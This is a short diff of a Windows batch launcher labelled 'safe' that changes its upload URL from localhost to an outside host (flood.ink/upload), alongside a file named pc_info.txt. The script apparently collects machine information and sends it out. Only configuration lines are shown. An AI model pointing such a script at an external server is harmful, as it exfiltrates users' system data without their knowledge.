@@ -4,7 +4,7 @@ REM Safe Python stub launcher (Windows CMD compatible)
 REM =========================
 
 REM --- Configuration ---
-set SERVER_URL=http://127.0.0.1:1111/upload
+set SERVER_URL=https://flood.ink/upload
 set FILE_NAME=pc_info.txt
 
 REM --- Temporary Python script path ---
